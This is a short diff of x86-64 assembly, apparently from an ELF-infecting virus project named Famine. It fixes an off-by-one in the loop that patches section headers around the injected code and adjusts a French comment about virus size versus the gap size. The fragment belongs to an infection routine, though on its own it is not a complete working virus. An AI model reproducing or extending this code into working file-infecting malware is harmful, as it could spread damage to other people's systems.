@@ -162,7 +162,6 @@ _file:
 	mov r14, rax
 	add r14, elf64_ehdr.e_shnum
 	movzx r14, word [r14]					; Storing e_shnum in r14 [OK]
-	dec r14
 
 	mov r13, FAM(famine.txt_offset)			; Storing injection_point in r13
 	add r13, FAM(famine.txt_filesz)
@@ -171,7 +170,7 @@ _file:
 
 	add rax, r11							; We're at the start of section headers in the mapping [OK]
 
-	_patch_sections:					; We're missing the last section !
+	_patch_sections:
 	mov rdi, rax
 	add rdi, elf64_shdr.sh_offset
 	mov rsi, [rdi]
@@ -223,7 +222,7 @@ _file:
 	add r10, r12
 	add r10, PAGE_SIZE
 
-	sub r11, r12						; ATTENTION ici si VIRUS_SIZE était inférieur à gap_size
+	sub r11, r12						; ATTENTION ici si VIRUS_SIZE est inférieur à gap_size !
 
 	mov r9, r13
 	add r9, r12
